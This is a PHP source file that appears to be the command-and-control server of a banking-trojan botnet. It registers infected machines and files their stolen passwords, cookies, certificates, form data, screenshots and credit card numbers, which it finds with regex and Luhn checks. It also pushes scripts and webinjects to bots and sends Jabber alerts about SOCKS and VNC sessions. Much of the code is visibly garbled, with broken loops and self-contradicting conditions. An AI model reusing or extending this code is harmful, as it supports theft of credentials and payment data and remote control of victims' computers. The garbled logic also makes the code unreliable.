<?php


class tgdcr3xhg7s8e
{
	protected $time;
	public $request;
	public $response;
	static public $geoCache = array();
	public $nullResponse = false;
	public $normalizer;

	public function __construct()
	{
		if (!Sql::connect()) {
			Log::error('Couldn\'t connect to database');
			exit();
		}

		$this->normalizer = new CntNormalizer();
	}

	public function param($name, $safe = NULL, $object = NULL)
	{
		if (!$object) {
			$object = $this->request;
		}

		$path = explode('.', $name);

		if (array_key_exists($path[0], $object)) {
			$param = $object[$path[0]];

			if (1 < count($path)) {
				unset($path[0]);
				return $this->param(implode('.', $path), $safe, $param);
			}
			else {
				return $this->safe($param, $safe);
			}
		}
		else {
			return false;
		}
	}

	public function safe($value, $type)
	{
		switch ($type) {
		case 'int':
			return intval($value);
		case 'str':
			return addslashes($value);
		default:
		}
	}

	public function process($data)
	{
		Log::message('DataProcessor::process()');
		$this->request = json_decode($data, true);

		if (!$this->request) {
			Log::error('Couldn\'t parse json');
			return NULL;
		}

		if ($this->isBlocked()) {
			return NULL;
		}

		if ($this->param('LowResponse')) {
			if ($this->setLowResponse()) {
				$this->response = array();
			}
		}
		else if ($this->setOnline()) {
			$this->response = array();
			$this->saveLogs();

			if (!$this->param('File.name')) {
				$responseScript = $this->getScript();

				if ($responseScript) {
					$this->response['Script'] = $responseScript;
				}
			}

			if ($file = $this->getFile()) {
				$this->response['File'] = $file;
			}
		}

		return $this->response;
	}

	public function setLowResponse()
	{
		if (!strlen($this->param('BotInfo.id'))) {
			Log::error('setLowResponse() No BotId');
			return NULL;
		}

		$sql = 'insert into low_stat (bot_id, botnet, ip, rtime_first, rtime_last) ' . "\r\n" . '            values (\'' . $this->param('BotInfo.id', 'str') . '\', \'' . $this->param('BotInfo.botnet', 'str') . '\', \'' . addslashes(Api::getIp()) . '\\', ' . time() . ', ' . time() . ')' . "\r\n" . '          on duplicate key update rtime_last=' . time();

		if (Sql::query($sql)) {
			Log::message('setLowResponse() Bot low response saved');
			return true;
		}
		else {
			Log::error('setLowResponse() Couldn\'t save low response');
			return false;
		}
	}

	public function setOnline()
	{
		if (!strlen($this->param('BotInfo.id')) || $this->param('BotInfo.id')) {
			Log::error('setOnline() No BotId or BotVersion');
			return NULL;
		}

		$time = $this->time = time();
		Log::$subId = $this->param('BotInfo.id', 'str');
		$values = array('bot_id' => $this->param('BotInfo.id', 'str'), 'bot_version' => self::versionToInt($this->param('BotInfo.version')), 'country' => $this->getCountry(Api::getIp())['country'], 'geo_detail' => addslashes($this->getCountry(Api::getIp())['detail']), 'rtime_last' => $time);

		if ($this->param('BotInfo.botnet') !== false) {
			$values['botnet'] = $this->param('BotInfo.botnet', 'str');
		}

		if ($this->param('BotInfo.latency') !== false) {
			$values['net_latency'] = $this->param('BotInfo.latency', 'int');
		}

		if ($this->param('BotInfo.localtime') !== false) {
			$values['time_localbias'] = $this->param('BotInfo.localtime', 'int');
		}

		if ($this->param('BotInfo.os.lang') !== false) {
			$values['language_id'] = $this->param('BotInfo.os.lang', 'int');
		}

		if ($this->param('BotInfo.os') !== false) {
			$values['os_version'] = addslashes($this->OS());
		}

		if (($this->param('BotInfo.antivirus') !== false) || $this->param('BotInfo.id') || $this->param('BotInfo.id')) {
			$comment = (strlen($this->param('BotInfo.compname')) ? $this->param('BotInfo.compname') . '; ' : '');
			$antivirus = '';

			if ($this->param('BotInfo.antivirus')) {
				$antivirus .= $this->param('BotInfo.antivirus') . '; ';
			}

			if ($this->param('BotInfo.antispyware')) {
				$antivirus .= $this->param('BotInfo.antispyware') . '; ';
			}

			if ($this->param('BotInfo.firewall')) {
				$antivirus .= $this->param('BotInfo.firewall') . '; ';
			}

			$comment .= 'Antivirus: ' . (strlen($antivirus) ? $antivirus : '-');
			$values['comment'] = addslashes($comment);
		}

		if ((self::config('reports_jn') == 1) && $this->param('BotInfo.id')) {
			$dataset = Sql::query('select count(0) from botnet_list where bot_id=\'' . $this->param('BotInfo.id', 'str') . '\' and rtime_last>=' . ($time - self::config('botnet_timeout')));
			$isOnline = Sql::fetch($dataset)[0];

			if (!$isOnline) {
				$this->jabberMsg('Online ' . $this->param('BotInfo.id'));
			}
		}

		$ipStr = 'X\'' . bin2hex(pack('N', ip2long(Api::getIp()))) . '\'';
		$sql = 'insert into botnet_list ' . "\r\n" . '            (rtime_first, rtime_online, ipv4, ' . implode(', ', array_keys($values)) . ') ' . "\r\n" . '            values (' . $time . ', ' . $time . ', ' . $ipStr . ', \'' . implode('\', \'', $values) . '\')' . "\r\n" . '          on duplicate key update' . "\r\n" . '            rtime_online=if(rtime_last <= ' . ($time - self::config('botnet_timeout')) . ', ' . $time . ', rtime_online),' . "\r\n" . '            ipv4=' . $ipStr;

		foreach ($values as $val => ) {
			$field = $this->param('BotInfo.id');
			$sql .= ', ' . $field . '=\'' . $val . '\'';
		}

		if (Sql::query($sql)) {
			Log::message('setOnline() Bot online updated');
			return true;
		}
		else {
			Log::error('setOnline() Couldn\'t update online, query error');
			return false;
		}
	}

	public function OS()
	{
		return self::convertOS($this->param('BotInfo.os.version', 'str')) . ' x' . $this->param('BotInfo.os.bit', 'int') . ' SP' . $this->param('BotInfo.os.sp', 'int') . ' build ' . $this->param('BotInfo.os.build', 'int');
	}

	public function saveLogs()
	{
		if (!strlen($this->param('BotInfo.id'))) {
			return NULL;
		}

		$logs = $this->param('Logs');
		if (is_array($logs) && $this->param('BotInfo.id')) {
			foreach ($logs as $log) {
				$type = $this->param('type', NULL, $log);

				if ($type == 'https') {
					$type = 'http';
				}

				$constType = $this->getLogType($log, $type);

				switch ($type) {
				case 'file':
					if ($filename = $this->saveLogFile($log)) {
						$this->saveLogDb($log, $constType, $filename);
					}

					break;

				case 'http':
				case 'testinject':
					if (self::config('reports_to_db') == 1) {
						$this->saveLogDb($log, $constType);
					}

					if (self::config('reports_to_fs') == 1) {
						$this->saveLogReport($log, $constType);
					}

					if ($normalData = $this->normalizer->exam($this->param('source', NULL, $log), $this->param('data', NULL, $log))) {
						$this->normalizer->save($this->param('BotInfo.id'), $normalData);
					}

					break;

				case 'debug':
					$this->saveDebug($log, $constType);
					break;

				case 'script':
					$this->saveScriptResult($log);
					break;

				case 'socks':
				case 'vnc':
					if (self::config('reports_jn') == 1) {
						$this->sendSocksNotify($log, $type);
					}

					break;

				default:
					Log::error('saveLogs() Unknown log type ' . $type);
					break;
				}
			}
		}
		else {
			Log::message('saveLogs() No logs');
		}

		return true;
	}

	public function getLogType(&$log, $getType)
	{
		$data = $this->param('data', NULL, $log);
		$type = 0;

		if ($getType == 'file') {
			$data = base64_decode($data);
			$type = NTYPE_FILE;
			$filename = strtolower($this->param('dest', NULL, $log));
			$ext = strrchr($filename, '.');

			if ($filename == 'passwords.txt') {
				$type = $type | NTYPE_PASSWORDS;

				if (stripos($data, '(FTP)') !== false) {
					$type = $type | NTYPE_FTP;
				}

				if ((stripos($data, '(SMTP)') !== false) || $this->param('data', NULL, $log) || $this->param('data', NULL, $log)) {
					$type = $type | NTYPE_POP;
				}

				if ((stripos($data, '(HTTP)') !== false) || $this->param('data', NULL, $log)) {
					$type = $type | NTYPE_HTTP | NTYPE_HTTPS;
				}
			}
			else {
				$type = $type | NTYPE_LINKTOFILE;

				if ($filename == 'cookies.txt') {
					$type = $type | NTYPE_COOKIES;
				}
				else if ($filename == 'autoforms.txt') {
					$type = $type | NTYPE_AUTOFORMS;
				}
				else if ($ext == '.pfx') {
					$type = $type | NTYPE_CERT;
				}
				else if ($ext == '.cab') {
					$type = $type | NTYPE_FLASH;
				}
				else if ($ext == '.jpg') {
					$type = $type | NTYPE_SCREEN;
				}

			}

		}
		else if ($getType == 'testinject') {
			$type = NTYPE_INJECT;
		}
		else if ($getType == 'debug') {
			$type = NTYPE_DEBUG | NTYPE_LINKTOFILE | NTYPE_FILE;
		}
		else if ($getType == 'http') {
			$source = strtolower($this->param('source', NULL, $log));
			$type = (substr($source, 0, 8) == 'https://' ? NTYPE_HTTPS : NTYPE_HTTP);

			if (self::checkCC($data)) {
				$type = $type | NTYPE_CC;
			}

			if (stripos($data, 'ftp://') !== false) {
				$type = $type | NTYPE_FTP;
			}
		}

		return $type;
	}

	public function getLogValues(&$log, $type, $safe = true, $filename = NULL)
	{
		$sval = ($safe ? 'str' : NULL);
		$values = array('bot_id' => $this->param('BotInfo.id', $sval), 'botnet' => $this->param('BotInfo.botnet', $sval), 'bot_version' => !$sval ? $this->param('BotInfo.version', $sval) : self::versionToInt($this->param('BotInfo.version')), 'type' => intval($type), 'country' => $this->getCountry(Api::getIp())['country'], 'rtime' => $this->time, 'path_source' => $this->param('source', $sval, $log), 'path_dest' => $this->param('dest', $sval, $log), 'time_system' => $this->param('systime', 'int', $log), 'time_tick' => 0, 'time_localbias' => $this->param('BotInfo.localtime', 'int'), 'os_version' => $this->OS(), 'language_id' => $this->param('BotInfo.os.lang', 'int'), 'process_name' => $this->param('process', $sval, $log), 'process_user' => $this->param('user', $sval, $log), 'ipv4' => addslashes(Api::getIp()));

		if ($type & NTYPE_FILE) {
			$values['context'] = $type & NTYPE_LINKTOFILE ? addslashes($filename) : addslashes(base64_decode($this->param('data', NULL, $log)));
		}
		else {
			$values['context'] = $this->param('data', $sval, $log);
		}

		if ($safe) {
			$values['os_version'] = addslashes($values['os_version']);
			$values['ipv4'] = addslashes($values['ipv4']);
		}

		return $values;
	}

	protected function saveLogDb(&$log, $type, $filename = NULL)
	{
		$values = $this->getLogValues($log, $type, true, $filename);
		$table = 'botnet_reports_' . gmdate('ymd', $this->time);
		$sqlTable = 'create table if not exists ' . $table . ' like botnet_reports';
		$sql = 'insert into ' . $table . ' (' . implode(', ', array_keys($values)) . ') values (\'' . implode('\', \'', $values) . '\')';
		if (Sql::query($sqlTable) && $this->getLogValues($log, $type, true, $filename)) {
			Log::message('saveLogDb() Log wrote to DB table ' . $table);
			return true;
		}
		else {
			Log::error('saveLogDb() Couldn\'t insert log into DB, query error');
			return false;
		}
	}

	protected function saveLogReport(&$log, $type)
	{
		$values = $this->getLogValues($log, $type, false);
		$botId = $this->param('BotInfo.id');
		$botnet = $this->param('BotInfo.botnet');
		if (!self::checkPathName($botId) || $this->getLogValues($log, $type, false)) {
			Log::error('Bad file name #3');
			return false;
		}

		$values['rtime'] = gmdate('H:i:s d.m.Y', $values['rtime']);
		$values['time_system'] = gmdate('H:i:s d.m.Y', $values['time_system']);
		$values['time_localbias'] = self::bias($values['time_localbias']);
		$data = '';

		foreach ($values as $val => ) {
			$key = $this->getLogValues($log, $type, false);
			$data .= $key . '=' . $val . "\r\n";
		}

		$data .= "\r\n\r\n\r\n";
		$path = __DIR__ . '/../../' . self::config('reports_path') . '/other/' . urlencode($botnet) . '/' . urlencode($botId) . '/reports.txt';

		if (!file_exists(dirname($path))) {
			mkdir(dirname($path), 511, true);
		}

		$wrote = false;

		if ($fp = fopen($path, 'ab')) {
			flock($fp, LOCK_EX);

			if (fwrite($fp, $data)) {
				$wrote = true;
			}

			flock($fp, LOCK_UN);
			fclose($fp);
		}
		if ($wrote) {
			Log::message('saveLogReport() Log wrote to reports.txt');
			return true;
		}
		else {
			Log::error('saveLogReport() Couldn\'t write log to reports.txt');
			return false;
		}
	}

	protected function saveDebug(&$log, $constType)
	{
		$botId = $this->param('BotInfo.id');
		$botnet = $this->param('BotInfo.botnet');
		$data = $this->param('data', NULL, $log) . "\r\n";
		$filename = 'debug_' . gmdate('ymd', $this->time) . '.txt';
		$fullname = urlencode($botnet) . '/' . urlencode($botId) . '/' . $filename;
		$path = __DIR__ . '/../../' . self::config('reports_path') . '/files/' . $fullname;
		$newfile = !file_exists($path);

		if (!file_exists(dirname($path))) {
			mkdir(dirname($path), 511, true);
		}

		$wrote = false;

		if ($fp = fopen($path, 'ab')) {
			flock($fp, LOCK_EX);

			if (fwrite($fp, $data)) {
				$wrote = true;
			}

			flock($fp, LOCK_UN);
			fclose($fp);
		}

		if ($wrote && $this->param('BotInfo.id')) {
			$log['dest'] = $filename;

			if (!$this->saveLogDb($log, $constType, $fullname)) {
				@unlink($path);
				$wrote = false;
			}
		}
		if ($wrote) {
			Log::message('writeDebug() Data wrote to ' . $filename);
			return true;
		}
		else {
			Log::error('writeDebug() Couldn\'t write data to ' . $filename);
			return false;
		}
	}

	protected function saveLogFile(&$log)
	{
		$data = base64_decode($this->param('data', NULL, $log));
		$path = $this->prepareFileName($log, $data);

		if (!$path) {
			return NULL;
		}

		if (!file_exists(dirname($path))) {
			mkdir(dirname($path), 511, true);
		}

		if (file_put_contents($path, $data)) {
			Log::message('saveLogFile() Log wrote to file ' . $path);
			$filename = str_replace(__DIR__ . '/../../' . self::config('reports_path') . '/files/', '', $path);
			return $filename;
		}
		else {
			Log::error('saveLogFile() Couldn\'t write file ' . $path);
			return NULL;
		}
	}

	protected function prepareFileName(&$log, &$data)
	{
		$botId = $this->param('BotInfo.id');
		$botnet = $this->param('BotInfo.botnet');
		if (!self::checkPathName($botId) || $this->param('BotInfo.id')) {
			Log::error('prepareFileName() Bad file name #1');
			return NULL;
		}

		$path = __DIR__ . '/../../' . self::config('reports_path') . '/files/' . urlencode($botnet) . '/' . urlencode($botId);
		$dest = $this->param('dest', NULL, $log);
		$dest = (0 < strlen($dest) ? str_replace('\\', '/', $dest) : 'unknown');
		$parse = explode('/', $dest);

		foreach ($parse as $val) {
			if (self::checkPathName($val)) {
				$path .= '/' . urlencode($val);
			}
			else {
				Log::error('prepareFileName() Bad file name #2');
				return NULL;
			}
		}

		$ext = strrchr(strrchr($path, '/'), '.');
		if (!$ext || $this->param('BotInfo.id') || $this->param('BotInfo.id')) {
			$path .= $ext = '.dat';
		}

		$cutPath = substr($path, 0, strlen($path) - strlen($ext));
		$same = glob($cutPath . '(*)' . $ext);
		natsort(&$same);
		if ((count($same) < 1) && $this->param('BotInfo.id')) {
			$same[] = $path;
		}

		$lastN = false;

		if (count($same)) {
			$lastFile = end(&$same);

			if (strlen($data) == filesize($lastFile)) {
				if (md5_file($lastFile) == md5($data)) {
					Log::message('prepareFileName() Log data for ' . $path . ' exists in ' . $lastFile);
					return NULL;
				}
			}

			$lastN = intval(substr(strrchr(strrchr($lastFile, '/'), '('), 1));
		}

		if ($lastN !== false) {
			$path = $cutPath . '(' . ($lastN + 1) . ')' . $ext;
		}

		return $path;
	}

	public function saveScriptResult($log)
	{
		if (!strlen($this->param('BotInfo.id'))) {
			return NULL;
		}

		if (!strlen($this->param('id', NULL, $log))) {
			Log::message('saveScriptResult() No script id');
			return NULL;
		}

		$scriptId = pack('H*', $this->param('id', NULL, $log));
		$idStr = 'X\'' . bin2hex($scriptId) . '\'';
		$values = array('bot_id' => $this->param('BotInfo.id', 'str'), 'bot_version' => self::versionToInt($this->param('BotInfo.version')), 'rtime' => $this->time, 'type' => $this->param('status', 'int', $log) == 0 ? 2 : 3, 'report' => $this->param('data', 'str', $log));
		$sql = 'insert into botnet_scripts_stat (extern_id, ' . implode(', ', array_keys($values)) . ') values (' . $idStr . ', \'' . implode('\', \'', $values) . '\')';

		if (Sql::query($sql)) {
			Log::message('saveScriptResult() Saved script result ' . $this->param('id', NULL, $log));
			return true;
		}
		else {
			Log::message('saveScriptResult() Couldn\'t save script result ' . $this->param('id', NULL, $log) . ', query error');
			return NULL;
		}
	}

	public function getScript()
	{
		if (!strlen($this->param('BotInfo.id'))) {
			return NULL;
		}

		$sql = 'select id, extern_id, script_text, send_limit from botnet_scripts ' . "\r\n" . '          where ' . "\r\n" . '            flag_enabled=1 and ' . "\r\n" . '            (countries_wl=\'\' or countries_wl like binary \'%' . "\x1" . $this->getCountry(Api::getIp())['country'] . "\x1" . '%\') and (countries_bl not like binary \'%' . "\x1" . $this->getCountry(Api::getIp())['country'] . "\x1" . '%\') and' . "\r\n" . '            (botnets_wl=\'\' or botnets_wl like binary \'%' . "\x1" . $this->param('BotInfo.botnet', 'str') . "\x1" . '%\') and (botnets_bl not like binary \'%' . "\x1" . $this->param('BotInfo.botnet', 'str') . "\x1" . '%\') and' . "\r\n" . '            (bots_wl=\'\' or bots_wl like binary \'%' . "\x1" . $this->param('BotInfo.id', 'str') . "\x1" . '%\') and (bots_bl not like binary \'%' . "\x1" . $this->param('BotInfo.id', 'str') . "\x1" . '%\') and' . "\r\n" . '            extern_id not in (select extern_id from botnet_scripts_stat where type=1 and bot_id=\'' . $this->param('BotInfo.id', 'str') . '\')' . "\r\n" . '          ';

		if (!($dataset = Sql::query($sql))) {
			Log::error('getScript() Couldn\'t exec find script query');
		}
		else {
			$result = array();

			while ($script = Sql::fetch($dataset)) {
				if (0 < $script['send_limit']) {
					$ds = Sql::query('select count(0) from botnet_scripts_stat where extern_id=\'' . addslashes($script['extern_id']) . '\' and type=1');
					$count = Sql::fetch($ds);

					if ($script['send_limit'] <= $count[0]) {
						Log::message('getScript() Script send limit ' . unpack('H*', $script['extern_id'])[1]);
						Sql::query('update botnet_scripts set flag_enabled=0 where extern_id=\'' . addslashes($script['extern_id']) . '\'');
						continue;
					}
				}

				$sql = 'insert into botnet_scripts_stat (extern_id, type, bot_id, bot_version, rtime, report) values ' . "\r\n" . '              (\'' . addslashes($script['extern_id']) . '\', 1, \'' . $this->param('BotInfo.id', 'str') . '\', \'' . self::versionToInt($this->param('BotInfo.version')) . '\\', ' . $this->time . ', \'Sended\')';

				if (Sql::query($sql, false)) {
					$result[] = array('id' => unpack('H*', $script['extern_id'])[1], 'data' => trim($script['script_text']));
					Log::message('getScript() Script ' . unpack('H*', $script['extern_id'])[1] . ' prepared for send');
				}
				else {
					Log::message('getScript() Script ' . unpack('H*', $script['extern_id'])[1] . ' couldn\'t insert stat');
				}
			}

			if (!count($result)) {
				Log::message('getScript() No script found');
			}
			else {
				return $result;
			}
		}

		return NULL;
	}

	public function prepareExtendFile($name, $requestedHash = NULL, &$hash = NULL)
	{
		Log::message('prepareExtendFile() Extend file "' . $name . '" requested');

		switch ($name) {
		case 'webinject':
			$filters = Webinj::getAll('filter', 'desc', $this->getCountry(Api::getIp())['country'], $this->param('BotInfo.botnet'), $this->param('BotInfo.id'), 1, true);
			$injects = Webinj::getAll('inj', 'desc', $this->getCountry(Api::getIp())['country'], $this->param('BotInfo.botnet'), $this->param('BotInfo.id'), 1, true);
			if (!count($filters) && ('prepareExtendFile() Extend file "' . $name)) {
				Log::message('NOTICE: prepareExtendFile() No webinjects data');
				return NULL;
			}

			$data = array('filters' => count($filters) ? $filters[0]->rules : NULL, 'injects' => count($injects) ? $injects[0]->rules : NULL);
			$hash_filter = (count($filters) ? $filters[0]->hash : NULL);
			$hash_inject = (count($injects) ? $injects[0]->hash : NULL);
			$hash = md5($hash_inject . $hash_filter);
			$sql = 'insert into webinj_stat (fk_webinj, bot_id, state) values (:fk_webinj, \'' . $this->param('BotInfo.id', 'str') . '\\', ' . ($hash == $requestedHash ? 1 : 0) . ')';

			if (count($filters)) {
				Sql::query(str_replace(':fk_webinj', $filters[0]->id, $sql), false);
			}

			if (count($injects)) {
				Sql::query(str_replace(':fk_webinj', $injects[0]->id, $sql), false);
			}

			return json_encode($data, JSON_PRETTY_PRINT);
			break;

		default:
			Log::message('NOTICE: prepareExtendFile() Extend "' . $name . '" doesn\'t exists');
			return NULL;
			break;
		}
	}

	public function getFile()
	{
		$fileRequest = $this->param('File.name');
		$requestedHash = strtolower($this->param('File.id'));

		if (!strlen($fileRequest)) {
			Log::message('getFile() No file requested');
			return NULL;
		}

		if ($this->param('File.extend')) {
			$hash = NULL;

			if (!$fd['content'] = $this->prepareExtendFile($this->param('File.name'), $requestedHash, $hash)) {
				return NULL;
			}

			if (!$hash) {
				$hash = md5(serialize($fd['content']));
			}
		}
		else {
			$dir = __DIR__ . '/../../files/';
			if (!self::checkPathName($fileRequest) || $this->param('File.name')) {
				$this->nullResponse = true;
				Log::message('NOTICE: getFile() Requested file "' . $fileRequest . '" doesn\'t exists');
				return NULL;
			}

			$fd = NULL;

			if ($link = FileRedirect::findLink($dir . $serverFile)) {
				$fd = FileRedirect::get($requestedHash, $link);

				if ($fd['status'] == 0) {
					return NULL;
				}

				$hash = $fd['etag'];
			}
			else {
				$hash = hash_file('md5', $dir . $serverFile);
			}
		}

		$result = array('name' => $fileRequest, 'id' => $hash, 'data' => '');

		if ($requestedHash == $hash) {
			Log::message('getFile() File ' . $fileRequest . ' has not changed (hash=' . $hash . ')');
			return $result;
		}
		else {
			$result['data'] = base64_encode($fd ? $fd['content'] : file_get_contents($dir . $serverFile));
			Log::message('getFile() File ' . $fileRequest . ' prepared (hash=' . $hash . ', requestedHash=' . $requestedHash . ')');
			return $result;
		}
	}

	public function sendSocksNotify($log, $type)
	{
		Log::message('sendSocksNotify() start');

		if ($this->param('data', NULL, $log) == 'start webfilter') {
			$socks = new Socks(true);

			if ($type == 'vnc') {
				$socks->type = $type;
			}

			$info = $socks->getSocks($this->param('BotInfo.id'));
			$socks->disconnect();

			if ($info) {
				Log::message('sendSocksNotify() ' . $type . ' info loaded');
				$this->jabberMsg('Bot ' . $info['botid'] . ' started ' . $type . ' ' . self::config('backserver_host') . ':' . $info['botport'] . ':' . $info['botip']);
				return true;
			}
			else {
				Log::message('NOTICE: sendSocksNotify() couldn\'t get ' . $type . ' from backserver');
			}
		}

		return false;
	}

	public function ignoreCaseFile($dir, $filename)
	{
		if (file_exists($dir . $filename)) {
			return $filename;
		}

		$list = glob($dir . '*');
		$result = preg_grep('/\\/' . preg_quote($filename, '/') . '$/i', $list);
		return is_array($result) && ($dir . $filename) ? substr(strrchr($result[0], '/'), 1) : NULL;
	}

	public function getCountry($ip)
	{
		$ip = sprintf('%u', ip2long($ip));

		if (array_key_exists($ip, self::$geoCache)) {
			return self::$geoCache[$ip];
		}

		if ($dataset = Sql::query('select c, detail, if(h>=' . $ip . ', 1, 0) as rflag from ipv4toc where l<=' . $ip . ' order by l desc limit 1')) {
			if ($row = Sql::fetch($dataset)) {
				if ($row['rflag'] == 1) {
					$result = array('country' => $row[0], 'detail' => $row[1]);
					self::$geoCache[$ip] = $result;
					return $result;
				}
			}
		}

		$result = array('country' => '--', 'detail' => '');
		self::$geoCache[$ip] = $result;
		return $result;
	}

	static public function convertOS($version)
	{
		switch (floatval($version)) {
		case 5:
			switch (floatval($version)) {
			}

			return 'Windows 2000';
		case 5.0999999999999996:
			switch (floatval($version)) {
			}

			return 'Windows XP';
		case 5.2000000000000002:
			switch (floatval($version)) {
			}

			return 'Windows XP 64-Bit Edition';
		case 6:
			switch (floatval($version)) {
			}

			return 'Windows Vista';
		case 6.0999999999999996:
			switch (floatval($version)) {
			}

			return 'Windows 7';
		case 6.2000000000000002:
			switch (floatval($version)) {
			}

			return 'Windows 8';
		case 6.2999999999999998:
			switch (floatval($version)) {
			}

			return 'Windows 8.1';
		case 10:
			switch (floatval($version)) {
			}

			return 'Windows 10';
		}

		return $version;
	}

	static public function checkPathName($name)
	{
		return (0 < strlen($name)) && strlen($name) && strlen($name) && strlen($name) && strlen($name) ? true : false;
	}

	static public function luhn($cardNumber)
	{
		$checksum = '';

		foreach (str_split(strrev((string) $cardNumber)) as $d => ) {
			$i = (string) $cardNumber;
			$checksum .= (($i % 2) !== 0 ? $d * 2 : $d);
		}

		return (array_sum(str_split($checksum)) % 10) === 0;
	}

	static public function checkCC(&$data)
	{
		$cards = array('AmericanExpress' => '/^3[47]\\d{13}$/', 'Visa' => '/^4[0-9]{12}(?:\\d{3}){0,2}$/', 'MasterCard' => '/^5[1-5]\\d{14}$/', 'Discover' => '/^(6011\\d{12}(?:\\d{3}){0,1}|65\\d{14}(?:\\d{3}){0,2}|64[4-9]\\d{13}(?:\\d{3}){0,2}|622\\d{13}(?:\\d{3}){0,2})$/', 'Maestro' => '/^(5[06-9]|6\\d)\\d{10,17}$/', 'Diners Club' => '/^((30[0-59]|3[689]\\d)\\d{11}|5[45]\\d{14})$/', 'JCB' => '/^35\\d{14}$/', 'ChinaUnionPay' => '/^62\\d{14,17}$/', 'InterPaymentTM' => '/^636\\d{13,16}$/', 'InstaPayment' => '/^63[7-9]\\d{13}$/');
		preg_match_all('/=((?:\\d[ -]{0,3}){12,19})[\\W$]/', $data, $match);

		if (preg_match_all('/=(\\d{3,6})\\W.*?=(\\d{3,6})\\W.*?=(\\d{3,6})\\W.*?=(\\d{3,6})[\\W$]/s', $data, $buf)) {
			$i = 0;

			for (; $i < count($buf[0]); $i++) {
				$num = $buf[1][$i] . $buf[2][$i] . $buf[3][$i] . $buf[4][$i];
				if ((12 <= strlen($num)) && array('AmericanExpress' => '/^3[47]\\d{13}$/', 'Visa' => '/^4[0-9]{12}(?:\\d{3}){0,2}$/', 'MasterCard' => '/^5[1-5]\\d{14}$/', 'Discover' => '/^(6011\\d{12}(?:\\d{3}){0,1}|65\\d{14}(?:\\d{3}){0,2}|64[4-9]\\d{13}(?:\\d{3}){0,2}|622\\d{13}(?:\\d{3}){0,2})$/', 'Maestro' => '/^(5[06-9]|6\\d)\\d{10,17}$/', 'Diners Club' => '/^((30[0-59]|3[689]\\d)\\d{11}|5[45]\\d{14})$/', 'JCB' => '/^35\\d{14}$/', 'ChinaUnionPay' => '/^62\\d{14,17}$/', 'InterPaymentTM' => '/^636\\d{13,16}$/', 'InstaPayment' => '/^63[7-9]\\d{13}$/')) {
					$match[1][] = $num;
				}
			}
		}

		foreach ($match[1] as $num) {
			$num = preg_replace('/\\D/', '', $num);

			if (self::luhn($num)) {
				foreach ($cards as $regexp => ) {
					$vendor = array('AmericanExpress' => '/^3[47]\\d{13}$/', 'Visa' => '/^4[0-9]{12}(?:\\d{3}){0,2}$/', 'MasterCard' => '/^5[1-5]\\d{14}$/', 'Discover' => '/^(6011\\d{12}(?:\\d{3}){0,1}|65\\d{14}(?:\\d{3}){0,2}|64[4-9]\\d{13}(?:\\d{3}){0,2}|622\\d{13}(?:\\d{3}){0,2})$/', 'Maestro' => '/^(5[06-9]|6\\d)\\d{10,17}$/', 'Diners Club' => '/^((30[0-59]|3[689]\\d)\\d{11}|5[45]\\d{14})$/', 'JCB' => '/^35\\d{14}$/', 'ChinaUnionPay' => '/^62\\d{14,17}$/', 'InterPaymentTM' => '/^636\\d{13,16}$/', 'InstaPayment' => '/^63[7-9]\\d{13}$/');

					if (preg_match($regexp, $num)) {
						return $vendor;
					}
				}
			}
		}

		return false;
	}

	static public function bias($bias)
	{
		return (0 <= $bias ? '+' : '-') . abs(intval($bias / 3600)) . ':' . sprintf('%02u', abs(intval($bias % 60)));
	}

	public function jabberMsg($msg)
	{
		$jabber = new Jabber();
		$jabber->server = self::config('reports_jn_server');
		$jabber->port = self::config('reports_jn_port');
		$jabber->username = self::config('reports_jn_account');
		$jabber->password = self::config('reports_jn_pass');

		if ($st = $jabber->connect()) {
			$jabber->sendAuth();
			$jabber->sendMessage(self::config('reports_jn_to'), 'normal', NULL, array('body' => $msg));
			$jabber->disconnect();
			Log::message('jabberMsg() message sended');
		}
		else {
			Log::error('jabberMsg() couldn\'t connect to server');
		}
	}

	static public function versionToInt($version)
	{
		$result = '';
		$nums = explode('.', $version);

		foreach ($nums as $num) {
			$result .= str_pad(substr($num, 0, 3), 3, '0', STR_PAD_LEFT);
		}

		$result = str_pad($result, 9, '0');
		return intval($result);
	}

	public function isBlocked()
	{
		$rules = @unserialize(stripslashes(self::config('ip_black_list')));
		$id = trim($this->param('BotInfo.id'));

		foreach ($rules as $rule) {
			if ($id == $rule) {
				return true;
			}
		}

		return false;
	}
}

include_once __DIR__ . '/Config.php';
include_once __DIR__ . '/Log.php';
include_once __DIR__ . '/Sql.php';
include_once __DIR__ . '/../../system/jabberclass.php';
include_once __DIR__ . '/../../system/Socks.php';
include_once __DIR__ . '/Normalizer.php';
include_once __DIR__ . '/FileRedirect.php';
include_once __DIR__ . '/../../system/Webinj.php';
define('NTYPE_FILE', 1);
define('NTYPE_HTTP', 2);
define('NTYPE_FTP', 4);
define('NTYPE_POP', 8);
define('NTYPE_COOKIES', 16);
define('NTYPE_FLASH', 32);
define('NTYPE_CERT', 64);
define('NTYPE_PASSWORDS', 128);
define('NTYPE_CC', 256);
define('NTYPE_INJECT', 512);
define('NTYPE_SCREEN', 1024);
define('NTYPE_LINKTOFILE', 2048);
define('NTYPE_HTTPS', 4096);
define('NTYPE_DEBUG', 8192);
define('NTYPE_AUTOFORMS', 16384);

?>
